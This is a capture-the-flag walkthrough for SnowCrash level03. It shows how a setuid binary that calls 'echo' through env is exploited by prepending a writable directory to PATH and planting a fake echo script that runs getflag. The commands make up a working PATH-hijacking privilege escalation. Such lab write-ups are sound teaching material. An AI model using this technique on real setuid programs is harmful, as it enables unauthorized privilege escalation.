#SnowCrash Level03

In this level we have a binary file in the home directory.
First of all we see what kind of file is this :
```
level03@SnowCrash:~$ file level03
level03: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0x3bee584f790153856e826e38544b9e80ac184b7b, not stripped
```

Just a normal executable file.
Let's see what strings can give us:
```
level03@SnowCrash:~$ strings level03
	[....]
	/usr/bin/env echo Exploit me
	[....]
```

Interesting, we can execute echo using the env.
A simple export shall exploit this little program.


```
level03@SnowCrash:~$ export PATH=/tmp/level03:$PATH
level03@SnowCrash:~$ vim /tmp/level03/echo
	[...]
	#!/bin/sh
	getflag
	[...]
level03@SnowCrash:~$ ./level03
Check flag.Here is your token :
```